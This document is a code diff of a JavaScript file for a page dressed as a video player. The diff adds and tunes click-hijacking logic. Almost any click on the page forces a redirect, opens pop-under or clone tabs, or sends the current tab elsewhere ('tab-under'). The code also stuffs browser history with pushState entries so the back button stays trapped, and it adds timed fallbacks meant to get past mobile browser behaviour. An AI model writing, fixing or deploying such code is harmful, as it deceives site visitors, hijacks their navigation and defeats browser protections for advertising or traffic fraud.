@@ -1,16 +1,14 @@
-/* common.js — vanisher-style micro handoff (patched v2)
+/* common.js — vanisher-style micro handoff (fixed)
    v1:
-     - BEFORE ready: any click (except micro controls) -> MAIN EXIT immediately
-     - AFTER  ready: micro -> open CLONE tab, current tab -> TABUNDER (AFU)
-                    other -> MAIN EXIT
+     - micro targets -> open CLONE tab, current tab redirects to TABUNDER (AFU)
+     - everything else -> MAIN EXIT (even before ready)
    v2 (clone):
      - ANY click anywhere -> MAIN EXIT (micro disabled)
-   Supports: mainExit, tabUnderClick, back, reverse, autoexit
 
    Fixes:
-   - reverse no longer calls initBack (prevents "back.html stuck" on early impatient clicks)
-   - early clicks (before ready) now do MAIN EXIT (except micro controls are swallowed)
-   - micro opens clone tab BEFORE any await (popup-safe)
+   - before READY: non-micro clicks trigger mainExit (no "only back.html in URL")
+   - dual-tab exit: fallback redirect if tab stays visible (mobile chrome cases)
+   - back pushState: restores original URL correctly
 */
 
 (() => {
@@ -26,7 +24,7 @@
     try { window.location.replace(url); } catch { window.location.href = url; }
   };
 
-  // popup-safe: open blank first, then navigate
+  // Open immediately (popup rules). Navigates blank -> target.
   const openTab = (url) => {
     try {
       const w = window.open("about:blank", "_blank");
@@ -79,7 +77,9 @@
       return "";
     }
   };
-  const osVersionPromise = getOsVersion(); // cache
+
+  // cache (avoid repeated delays)
+  const osVersionPromise = getOsVersion();
 
   const buildCmeta = () => {
     try {
@@ -200,11 +200,12 @@
   const pushBackStates = (url, count) => {
     try {
       const n = Math.max(0, parseInt(count, 10) || 0);
-      const originalUrl = window.location.href;
+      const originalUrl = window.location.href; // MUST capture before pushState changes address bar
 
       for (let i = 0; i < n; i++) {
         window.history.pushState(null, "Please wait...", url);
       }
+
       window.history.pushState(null, document.title, originalUrl);
     } catch (e) {
       err("Back pushState error:", e);
@@ -229,7 +230,7 @@
 
     const qs = await buildExitQS({ zoneId: b.zoneId });
 
-    // for your back.html router
+    // router params for your back.html
     if (b.url) {
       qs.set("url", String(b.url));
     } else {
@@ -258,18 +259,13 @@
     replaceTo(url);
   };
 
+  // Dual-tabs with fallback (if page stays visible, redirect current anyway)
   const runExitDualTabs = async (cfg, name, withBack = true) => {
     const ex = cfg?.[name];
     if (!ex) return;
 
     const ct = ex.currentTab;
     const nt = ex.newTab;
-
-    // pre-open (popup-safe) if this exit has newTab configured
-    const preWin = nt ? safe(() => window.open("about:blank", "_blank")) : null;
-    if (preWin) {
-      try { preWin.opener = null; } catch {}
-    }
 
     let ctUrl = "", ntUrl = "";
 
@@ -289,30 +285,47 @@
 
     if (withBack) await initBack(cfg);
 
-    // navigate pre-opened window if possible
-    if (ntUrl) {
-      let w = null;
-
-      if (preWin) {
-        w = preWin;
-        try { w.location.replace(ntUrl); } catch { try { w.location.href = ntUrl; } catch {} }
-      } else {
-        w = openTab(ntUrl);
-      }
-
-      if (w && ctUrl) {
-        const onVis = () => {
-          if (document.visibilityState === "visible") {
-            document.removeEventListener("visibilitychange", onVis);
-            replaceTo(ctUrl);
-          }
-        };
-        document.addEventListener("visibilitychange", onVis);
-        return;
-      }
+    if (!ntUrl) {
+      if (ctUrl) replaceTo(ctUrl);
+      return;
     }
 
-    if (ctUrl) replaceTo(ctUrl);
+    const w = openTab(ntUrl);
+
+    // If newTab failed, just redirect current immediately.
+    if (!w) {
+      if (ctUrl) replaceTo(ctUrl);
+      return;
+    }
+
+    // If we have currentTab URL, do:
+    // - redirect on return (visibilitychange)
+    // - BUT if tab stays visible (common mobile case) => redirect after short delay
+    if (ctUrl) {
+      let done = false;
+
+      const cleanup = () => {
+        document.removeEventListener("visibilitychange", onVis);
+      };
+
+      const doRedirect = () => {
+        if (done) return;
+        done = true;
+        cleanup();
+        replaceTo(ctUrl);
+      };
+
+      const onVis = () => {
+        if (document.visibilityState === "visible") doRedirect();
+      };
+
+      document.addEventListener("visibilitychange", onVis);
+
+      // Fallback: if still visible shortly after openTab, redirect now
+      setTimeout(() => {
+        if (!done && document.visibilityState === "visible") doRedirect();
+      }, 250);
+    }
   };
 
   const run = async (cfg, name) => {
@@ -331,20 +344,17 @@
 
     let armed = false;
 
-    // IMPORTANT: do NOT call initBack here (this was causing "back.html" stuck/flicker)
-    window.addEventListener("click", () => {
+    window.addEventListener("click", async () => {
       if (armed) return;
       armed = true;
 
-      // tiny delay: if we instantly navigate away, timer won't matter
-      setTimeout(() => {
-        try {
-          const keep = window.location.pathname + window.location.search;
-          window.history.pushState(null, "", keep);
-        } catch (e2) {
-          err("Reverse arm error:", e2);
-        }
-      }, 0);
+      try {
+        await initBack(cfg);
+        const keep = window.location.pathname + window.location.search;
+        window.history.pushState(null, "", keep);
+      } catch (e2) {
+        err("Reverse arm error:", e2);
+      }
     }, { capture: true, once: true });
 
     window.addEventListener("popstate", () => {
@@ -379,7 +389,7 @@
   };
 
   // ---------------------------
-  // READY gate
+  // READY flag (kept for logic, but mainExit must work even before ready)
   // ---------------------------
   const isPlayerReady = () => {
     const btn = document.querySelector(".xh-main-play-trigger");
@@ -411,11 +421,13 @@
     if (isClone) return;
 
     if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") {
+      // second micro attempt -> treat as mainExit (by your spec: after micro, clone does main; v1 also can degrade)
       return run(cfg, "mainExit");
     }
+
     safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));
 
-    // open clone BEFORE await (popup-safe)
+    // popup-safe: open clone BEFORE awaits
     const cloneUrl = buildCloneUrl();
     safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
     openTab(cloneUrl);
@@ -436,6 +448,7 @@
   const initClickMap = (cfg) => {
     const fired = { mainExit: false, back: false };
 
+    // your micro targets
     const microTargets = new Set([
       "timeline",
       "play_pause",
@@ -450,7 +463,7 @@
       const zone = e.target?.closest?.("[data-target]");
       const t = zone?.getAttribute("data-target") || "";
 
-      // Back button (your arrow)
+      // UI back button (separate exit)
       if (t === "back_button") {
         if (fired.back) return;
         fired.back = true;
@@ -460,7 +473,7 @@
         return;
       }
 
-      // CLONE: any click -> mainExit
+      // CLONE: any click -> mainExit (no micro, no ready gate)
       if (isClone) {
         if (fired.mainExit) return;
         fired.mainExit = true;
@@ -470,25 +483,7 @@
         return;
       }
 
-      // BEFORE READY:
-      // - micro controls: swallow (no random behaviour)
-      // - everything else (video/miniature/black space/play attempts): MAIN EXIT immediately
-      if (!isPlayerReady()) {
-        if (microTargets.has(t)) {
-          e.preventDefault();
-          e.stopPropagation();
-          return;
-        }
-
-        if (fired.mainExit) return;
-        fired.mainExit = true;
-        e.preventDefault();
-        e.stopPropagation();
-        run(cfg, "mainExit").catch(err);
-        return;
-      }
-
-      // AFTER READY: micro -> microHandoff
+      // v1: micro targets -> micro handoff (allowed even before ready)
       if (microTargets.has(t)) {
         e.preventDefault();
         e.stopPropagation();
@@ -496,7 +491,7 @@
         return;
       }
 
-      // AFTER READY: any other click -> mainExit
+      // v1: everything else -> MAIN EXIT (IMPORTANT: even before READY)
       if (fired.mainExit) return;
       fired.mainExit = true;
       e.preventDefault();
@@ -522,6 +517,7 @@
       run: (name) => run(cfg, name),
       initBack: () => initBack(cfg),
       microHandoff: () => runMicroHandoff(cfg),
+      isPlayerReady,
     };
 
     initClickMap(cfg);
@@ -529,6 +525,7 @@
     initReverse(cfg);
   };
 
+  // execute asap (defer scripts run at parse end; readyState usually "interactive")
   if (document.readyState === "loading") {
     document.addEventListener("DOMContentLoaded", boot);
   } else {
